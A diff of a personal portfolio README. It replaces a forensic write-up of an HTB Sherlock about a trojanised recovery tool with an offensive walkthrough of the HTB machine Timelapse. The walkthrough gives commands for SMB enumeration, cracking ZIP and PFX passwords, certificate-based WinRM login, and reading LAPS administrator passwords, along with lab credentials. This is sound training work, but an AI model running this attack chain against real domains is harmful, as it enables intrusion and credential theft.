@@ -1,91 +1,150 @@
 
-CTF-Sherlocks Walkthrough Page
+CTF Walkthrough's
 ---
 
 <a href="http://www.linkedin.com/in/daemon-adams">LinkedIn</a>
 
 
 Welcome to my GitHub portfolio
-Here, I document my journey through HTB Sherlocks, TryHackMe challenges, that demonstrate my skills in offensive and defensive security. 
+Here, I document my journey through HTB CTFs, TryHackMe challenges, demonstrating my skills in offensive security. 
 This space serves as both a showcase of my technical capabilities and a reflection of my commitment to continuous learning in the cybersecurity field.
 
-# **Sherlock's**
+# **HTB CTF**
 
-## Trojan
-  Completed: 07/23/25
+## Timnelapse
+  Completed: 11/16/25
   
   Analyst: Dae'mon Adams
 
-Scenario: John Grunewald was deleting some old accounting documents when he accidentally deleted an important document he had been working on. He panicked and downloaded software to recover the document, but after installing it, his PC started behaving strangely. 
-Feeling even more demoralised and depressed, he alerted the IT department, who immediately locked down the workstation and recovered some forensic evidence. Now it is up to you to analyze the evidence to understand what happened on John's workstation.
-
 **Tools used**:
-  - Wireshark
-  - FTK Imager
-  - Volatility
+  - nmap
+  - netexec
+  - smbclient
+  - zip2john & pf2john
+  - 7z
+  - Hashcat
+  - openssl
+  - evil-winrm
+  - bloodyAD
   
 ---
-Task 1: What is the build version of the operating system?
- - Answer: 19041
- - Explanation: Using Volatility, the build version 19041 was extracted from the memory image. This indicates the workstation was running Windows 10 version 2004, a key data point for ensuring compatibility with memory analysis tools.
 ![Image](Image Folder/Screenshot 2025-07-23 191819.png)
 
-Task 2: What is the computer hostname?
- - Answer: DESKTOP-38NVPD0
- - Explanation: The hostname was retrieved directly from Wireshark, identifying the compromised machine within the organization’s network.
-![Image](Image Folder/Screenshot 2025-07-23 194631.png)
+## Initial Enumeration
+I used a initial Nmap scan to map the targets open ports as well as it's exposed services to identify any potential misconfigurations that could be chianed later on in the attack. The results from the scan below can confirm that this machine is a domain-joined machine,
+and If you look at the Host script results this machine has a clock screw, meaning it is best to match the time to the machine using the tool **ntpdate** towards the domain.
 
-Task 3: What is the name of the downloaded ZIP file?
- - Answer: Data_Recovery[.]zip
- - Explanation: Using FTK Imager, the suspicious ZIP archive downloaded by the user was found in the Downloads directory. It contained the malicious executable responsible for the compromise.
-![Image](Image Folder/Screenshot 2025-07-23 193603.png)
+```Bash
+sudo nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN nmap_sV.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt
+```
 
-Task 4: What is the domain of the website (including the third-level domain) from which the file was downloaded?
- - Answer: praetorial-gears[.]000webhostapp[.]com
- - Explanation: Using Wireshark's HTTP object list and DNS query logs, this domain was identified as the origin of the downloaded ZIP. It was hosted on a free web hosting provider, commonly abused for malware delivery.
-![Image](Image Folder/Screenshot 2025-07-23 195110.png)
+```Bash
+sudo ntpdate timelapse.htb
+```
 
-Task 5: What is the process PID of the suspicious application?
- - Answer:484
- - Explanaiton: Volatility’s pslist plugin revealed that the suspicious executable, Recovery_Setup.exe, was running with PID 484, confirming execution of the payload.
-![Image](Image Folder/Screenshot 2025-07-23 195931.png)
+## SMB Enumeration
+The Nmap scan indicateds the machines SMB server has guest access, i confirmed this using the tool **netexec**. Now that i am sure i can acccess the shares guest account i can now enumerate for any available share names by using **smbclient**
 
-Task 6: What is the full path of the suspicious process?
- - Answer: C:\Users\John\Downloads\Data_Recovery\Recovery_Setup[.]exe
- - Explanation: Memory analysis confirmed the exact execution path of the malware, linking it directly to the downloaded ZIP archive.
-![Image](Image Folder/Screenshot 2025-07-23 200258.png)
+```Bash
+nxc smb $target -u 'admin' -p 'admin'
+```
 
-Task 7: What is the SHA-256 hash of the suspicious executable?
- - Answer: C34601C5DA3501F6EE0EFCE18DE7E6145153ECFAC2CE2019EC52E1535A4B3193
- - Explantaion: Using Wiresharks HTTP Object List, the file hash was downloaded on my Windows VM and cross-referenced on VirusTotal, revealing high detection as a Trojan. This hash served as a key indicator for threat attribution.
-![Image](Image Folder/Screenshot 2025-07-23 200828.png)
+### Accessing the Share Directory
+The list of availabe shares has a specific share named "Shares" that has two folders named "Dev" containinf a password protected zip file named `winrm_backup`and "HelpDesk" which has LAPS msi files and other docx files supporting creating new local admin passwords, i choose to download the backup zipfile to crack on my attack host.
 
-Task 8: When was the malicious program first executed?
- - Answer: 2023-05-30 02:06:29
- - Explanation: Execution timestamps were extracted from the Windows Prefetch data. This allowed analysts to determine initial infection time and correlate it with user activity.
-![Image](Image Folder/Screenshot 2025-07-23 202944.png)
+```Bash
+smbclient -N -L //$target -U 'guest'
+```
+## Credential Extraction from a Zip file
+Since i found this zip file in a "Dev" folder i can assume some type of credentials can be held within this file, i decided to use the tool **7z** to inspect the archive to enumerate it's contents and came to find a `.pfx` (`legacyy_dev_auth.pfx`) file to a legacy user
 
-Task 9: How many times in total has the malicious application been executed?
- - Answer: 2
- - Explanation: Prefetch artifacts revealed two distinct execution events of the malicious file, reinforcing the persistence or repeated user error.
+```Bash
+7z l winrm_backup.zip
+```
+### Cracking the ZIP Password
+Now that i can confirm that this file houses credentials, i used zip2john to convert the file into a hash file named `winrm_creds` and used the tool **hashcat** to recover the password `supremelegacy`.
+
+```Bash
+zip2john winrm_backup.zip > winrm_creds
+
+hashcat -m 17200 -a 0 winrm_creds /opt/Tools/SecLists/Passwords/Leaked-Databases/rockyou.txt
+```
+### Extracting and Cracking the PFX file
+Once i used the password to extract the pfx file i used **pfx2john** to extract it into a hash file, i then used john to crack the hash to discover the password of **thuglegacy**
+
+```Bash
+pfx2john legacyy_dev_auth.pfx > hash.txt
+
+john hash.txt --wordlist=/opt/Tools/SecLists/Passwords/Leaked-Databases/rockyou.txt
+```
+## Accessing a WinRM session with SSL Certificates
+The inital nmap scan revealed that port `5986/tcp` (WinRM) is configured to require certificate-based authentication, this shifted my focus to validate whether certificate-based impersonation was possible.
+
+### Extracting Certificate Metadata
+I first enumerated the Common Name of the user of the credentials and it pulled the user **Legacyy**. I then used the password to the credentials (**thuglegacy**) to create `.pem` files as well as a **rsa key and certificate** to use to log into **evil-winrm** since i cannot log in directly
+
+```Bash
+openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out legacyy_dev_auth.pem
+
+openssl x509 -in legacy_dev_auth.pem -noout -subject
+```
+### Exporting Keys for Evil-WinRM
+```Bash
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
+openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
+openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
+```
+### WinRM Access as Legacyy
+Now that i made the valid ssl credentials i can now authenticate as the user **Legacyy** leading me to get the user.txt file
+
+```Bash
+evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
+```
+
+## ACL & Domain Enumeration
+After establishing user-level access, i shifted into enumerating the compromised user privileges, ACL misconfiguratiuons, AD groups and object permissions. I wanted to determine how far the compromised user ccould pivot inside the domain.
+
+### Group Rights Review
+This user is apart of a group called Development, i enumerated the ACL permissions of the group and discovered this user has **GenericAll** permissions
+
+```Bash
+whoami /all
+
+Get-DomainObjectAcl -Identity "S-1-5-21-671920749-559770252-3318990721-3101" -ResolveGUID
+```
+
+## Privilege Escalation via svc_deploy
+I uploaded a copy of the powershell script **winPEAS** to accelerate enumeration this tool helps enumerate privilege escalation vectors, registry misconfigurations, stored credentials, and environment weaknesses. WinPEAS revealed harcoded credentials for a service account named `svc_deploy` and the password 'E3R$Q62^12p7PLlC%KWaxuaV'.
+
+```Bash
+upload /home/Dae/Documents/HTB/CTFs/Timelapse/winPEAS.ps1
+Import-Module .\winPEAS.ps1
+```
+
+### Verifying Credentials with NetExec
+Service accounts often provide indirect privilege paths due to delegated permissions, automation tasks, or outdated access control. This would later prove critical for domain escalation.
+
+```Bash
+nxc winrm $target -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
+```
+
+## LAPS Abuse for Domain Admin
+Because i already identified LAPS documentation earlier in the engagement, i supected LAPS would play a role so i used **netexec's** bloodhound module to pull the information of the domain. Using bloodhound i confirmed the service account `svc_deploy` has LAPS read permissions, with this confirmed i leveraged the permissions using **bloodyAD** to extract the LAPS password to return the local Administrator password for `DC01`.
+
+```Bash
+netexec ldap timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --bloodhound --collection All --dns-server $target
+
+bloodyAD --host $target -d timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+```
+
+## Domain Admin Access 
+Once i received the password i logged in as the administrator using evil-winrm, the root flag was not located in the Administrator directory so i enumerated the other users i have yet to compromise and found it in the user **TRX's** Desktop folder.
+
+```Bash
+evil-winrm -i DC01.timelapse.htb -u Administrator -p 'a;o2/Z+RC1E;jJj.KA2kYRQ0' -S
+```
 
 
-Task 10: What is the other .TMP file referenced by the malware, aside from IS-NJBAT.TMP?
- - Answer: IS-R7RFP.TMP
- - Explanation: Both TMP files were found in memory and linked to the malware’s runtime behavior. These likely acted as temporary staging files used during the infection process.
-![Image](Image Folder/Screenshot 2025-07-23 203137.png)
 
-Task 11: How many URLs contacted by the malicious application were detected as malicious by VirusTotal?
- - Answer: 4
- - Explanation: Captured network traffic in the PCAP file, analyzed with Wireshark and verified with VirusTotal, showed four outbound URLs flagged for malicious activity. These were likely C2 servers.
-![Image](Image Folder/Screenshot 2025-07-23 203447.png)
 
-Task 12: What is the name of the binary file downloaded by the malware?
- - Answer: puk.php
- - Explanation: The file puk.php was identified in the HTTP object list and appeared to be downloaded from one of the malicious C2 domains. It could have been a secondary payload or a data exfiltration script.
-![Image](Image Folder/Screenshot 2025-07-23 205103.png)
 
-Task 13: What was the name and version of the legitimate software the malware was impersonating?
- - Answer: FinalRecovery v3.0.7.0325
- - Explanation: By searching the internet with the SHA-256 hash i found a public sandbox reports (e.g., Joe Sandbox), the malware was found to mimic FinalRecovery, a legitimate data recovery application, to gain user trust and avoid suspicion.
-<a href="https://www.joesandbox.com/analysis/790730/0/pdf">
